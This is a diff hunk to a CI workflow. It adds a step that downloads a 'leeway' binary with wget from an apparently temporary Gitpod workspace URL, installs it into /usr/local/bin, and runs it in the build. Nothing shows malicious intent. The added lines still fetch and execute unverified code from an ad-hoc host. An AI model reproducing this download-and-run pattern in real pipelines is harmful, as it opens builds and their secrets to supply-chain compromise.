@@ -213,6 +213,9 @@ jobs:
           # CPUs/2
           MAX_CONCURRENT_TASKS=$(($(nproc) / 2))
 
+          wget https://8080--0195b910-1349-73b4-a24c-a0c5a2c48849.us01.gitpod.dev/leeway -O /usr/local/bin/leeway
+          chmod +x /usr/local/bin/leeway
+
           leeway build dev:all \
             --max-concurrent-tasks $MAX_CONCURRENT_TASKS \
             --docker-build-options network=host \
